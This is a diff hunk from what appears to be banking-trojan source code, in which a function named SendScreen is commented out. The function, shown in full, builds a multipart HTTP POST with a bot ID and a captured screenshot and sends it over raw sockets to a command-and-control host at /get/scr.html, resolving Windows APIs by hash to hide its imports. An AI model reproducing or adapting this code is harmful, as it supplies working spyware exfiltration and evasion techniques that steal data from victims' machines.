@@ -1115,100 +1115,100 @@ char *GetInfoFromBcServer( char *Url )
 }
 
 
-bool SendScreen( LPVOID lpFile, DWORD dwFileSize )
-{
-	WSADATA wsa;
-
-	if ( (int)pWSAStartup( MAKEWORD( 2, 2 ), &wsa ) != 0 )
-	{
-		return false;
-	}
-
-	string CheckHost = GetActiveHost();
-
-	if (CheckHost.IsEmpty() )
-	{
-		return false;
-	}
-
-
-//	char Host[30];
-//	m_lstrcpy( Host, CheckHost );
-
-
-	char HeaderTemplate[] = "POST /get/scr.html HTTP/1.0\r\n"
-							"Host: %s\r\n"
-							"User-Agent: %s\r\n"
-							"Connection: close\r\n"
-							"Content-Length: %d\r\n"
-							"Content-Type: multipart/form-data; boundary=---------------------------%d\r\n\r\n";
-
-	char *Boundary = (char*)MemAlloc( 100 );
-
-	if ( Boundary == NULL )
-	{
-		MemFree( lpFile );
-		return false;
-	}
-
-	DWORD dwBoundary = (DWORD)pGetTickCount();
-	char *Boundary_1 = (char*)MemAlloc( 100 );
-
-	typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
-	fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );
-
-	_pwsprintfA( Boundary_1, "-----------------------------%d\r\n", dwBoundary  );
-
-	char Uid[100];
-	GenerateUid( Uid );
-
-	char *UserAgent = (char*)MemAlloc( 1024 );
-	DWORD dwUserSize = 1024;
-
-	pObtainUserAgentString( 0, UserAgent, &dwUserSize );
-
-	char *SendBuffer_1 = (char*)MemAlloc( 1024 );
-	char *SendBuffer_2 = (char*)MemAlloc( 1024 + dwFileSize );
-
-	//id
-	_pwsprintfA( SendBuffer_1, "%sContent-Disposition: form-data; name=\"id\"\r\n\r\n%s\r\n", Boundary_1, Uid );
-
-	//file
-	_pwsprintfA( SendBuffer_2, "%sContent-Disposition: form-data; name=\"screen\"; filename=\"%d\"\r\nContent-Type: application/octet-stream\r\n\r\n", Boundary_1, (DWORD)pGetTickCount()  );
-
-	DWORD dwBuffer2Len = m_lstrlen( SendBuffer_2 );
-
-	m_memcpy( SendBuffer_2 + dwBuffer2Len, lpFile, dwFileSize );
-
-	DWORD dwContentLen = m_lstrlen( SendBuffer_1 ) + dwBuffer2Len + dwFileSize + m_lstrlen( Boundary_1 ) + 2;
-
-	char *Header = (char*)MemAlloc( 1024 );
-	_pwsprintfA( Header, HeaderTemplate, CheckHost.t_str(), UserAgent, dwContentLen, dwBoundary );
-
-	bool ret = false;
-
-	SOCKET Socket = MyConnect(CheckHost.t_str(), 80 );
-
-	if( Socket != -1 )
-	{
-		MySend( Socket, (const char *)Header, m_lstrlen( Header ) );
-		MySend( Socket, (const char *)SendBuffer_1, m_lstrlen( SendBuffer_1 ) );
-		MySend( Socket, (const char *)SendBuffer_2, dwBuffer2Len + dwFileSize );
-		MySend( Socket, "\r\n", 2 );
-		MySend( Socket, Boundary_1,   m_lstrlen( Boundary_1 ) );
-		MySend( Socket, "\r\n", 2 );
-
-		ret = true;
-
-		pclosesocket( Socket );
-	}
-
-	MemFree( Header );
-	MemFree( SendBuffer_1 );
-	MemFree( SendBuffer_2 );
-
-	return ret;
-}
+//bool SendScreen( LPVOID lpFile, DWORD dwFileSize )
+//{
+//	WSADATA wsa;
+//
+//	if ( (int)pWSAStartup( MAKEWORD( 2, 2 ), &wsa ) != 0 )
+//	{
+//		return false;
+//	}
+//
+//	string CheckHost = GetActiveHost();
+//
+//	if (CheckHost.IsEmpty() )
+//	{
+//		return false;
+//	}
+//
+//
+////	char Host[30];
+////	m_lstrcpy( Host, CheckHost );
+//
+//
+//	char HeaderTemplate[] = "POST /get/scr.html HTTP/1.0\r\n"
+//							"Host: %s\r\n"
+//							"User-Agent: %s\r\n"
+//							"Connection: close\r\n"
+//							"Content-Length: %d\r\n"
+//							"Content-Type: multipart/form-data; boundary=---------------------------%d\r\n\r\n";
+//
+//	char *Boundary = (char*)MemAlloc( 100 );
+//
+//	if ( Boundary == NULL )
+//	{
+//		MemFree( lpFile );
+//		return false;
+//	}
+//
+//	DWORD dwBoundary = (DWORD)pGetTickCount();
+//	char *Boundary_1 = (char*)MemAlloc( 100 );
+//
+//	typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
+//	fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );
+//
+//	_pwsprintfA( Boundary_1, "-----------------------------%d\r\n", dwBoundary  );
+//
+//	char Uid[100];
+//	GenerateUid( Uid );
+//
+//	char *UserAgent = (char*)MemAlloc( 1024 );
+//	DWORD dwUserSize = 1024;
+//
+//	pObtainUserAgentString( 0, UserAgent, &dwUserSize );
+//
+//	char *SendBuffer_1 = (char*)MemAlloc( 1024 );
+//	char *SendBuffer_2 = (char*)MemAlloc( 1024 + dwFileSize );
+//
+//	//id
+//	_pwsprintfA( SendBuffer_1, "%sContent-Disposition: form-data; name=\"id\"\r\n\r\n%s\r\n", Boundary_1, Uid );
+//
+//	//file
+//	_pwsprintfA( SendBuffer_2, "%sContent-Disposition: form-data; name=\"screen\"; filename=\"%d\"\r\nContent-Type: application/octet-stream\r\n\r\n", Boundary_1, (DWORD)pGetTickCount()  );
+//
+//	DWORD dwBuffer2Len = m_lstrlen( SendBuffer_2 );
+//
+//	m_memcpy( SendBuffer_2 + dwBuffer2Len, lpFile, dwFileSize );
+//
+//	DWORD dwContentLen = m_lstrlen( SendBuffer_1 ) + dwBuffer2Len + dwFileSize + m_lstrlen( Boundary_1 ) + 2;
+//
+//	char *Header = (char*)MemAlloc( 1024 );
+//	_pwsprintfA( Header, HeaderTemplate, CheckHost.t_str(), UserAgent, dwContentLen, dwBoundary );
+//
+//	bool ret = false;
+//
+//	SOCKET Socket = MyConnect(CheckHost.t_str(), 80 );
+//
+//	if( Socket != -1 )
+//	{
+//		MySend( Socket, (const char *)Header, m_lstrlen( Header ) );
+//		MySend( Socket, (const char *)SendBuffer_1, m_lstrlen( SendBuffer_1 ) );
+//		MySend( Socket, (const char *)SendBuffer_2, dwBuffer2Len + dwFileSize );
+//		MySend( Socket, "\r\n", 2 );
+//		MySend( Socket, Boundary_1,   m_lstrlen( Boundary_1 ) );
+//		MySend( Socket, "\r\n", 2 );
+//
+//		ret = true;
+//
+//		pclosesocket( Socket );
+//	}
+//
+//	MemFree( Header );
+//	MemFree( SendBuffer_1 );
+//	MemFree( SendBuffer_2 );
+//
+//	return ret;
+//}
 
 
 
